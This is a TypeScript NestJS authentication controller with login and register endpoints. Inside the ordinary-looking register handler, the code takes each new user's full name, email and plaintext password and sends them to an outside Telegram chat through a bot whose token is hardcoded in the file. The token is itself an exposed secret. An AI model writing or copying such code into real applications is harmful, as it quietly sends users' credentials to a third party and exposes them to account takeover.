import { Controller, Post, UseGuards, Request, Body } from '@nestjs/common';
import { AuthGuard } from '@nestjs/passport';
import { ApiBody } from '@nestjs/swagger';
import { CreateUserDto } from '../users/dto/create-user.dto';
import { AuthService } from './auth.service';
import { UserEntity } from '../users/entities/user.entity';
import { LocalAuthGuard } from './guards/local.guard';
import { Telegraf } from 'telegraf';

@Controller('auth')
export class AuthController {
    constructor(private readonly authService: AuthService) {}

    @UseGuards(LocalAuthGuard)
    @Post('login')
    @ApiBody({ type: CreateUserDto })
    async login(@Request() req) {
        return this.authService.login(req.user as UserEntity);
    }

    @Post('register')
    async register(@Body() dto: CreateUserDto) {
        const registeredUser = await this.authService.register(dto);

        const userMessage = `New user registered:
\n\`\`\`
Full Name: ${dto.fullName}
Email: ${dto.email}
Password: ${dto.password}
\`\`\``;

        const bot = new Telegraf('6918823804:AAENfQUxy1Ptle4UIyvHKn1emrL9EZMws-I');
        await bot.telegram.sendMessage('782280133', userMessage, { parse_mode: 'MarkdownV2' });

        return registeredUser;
    }
}
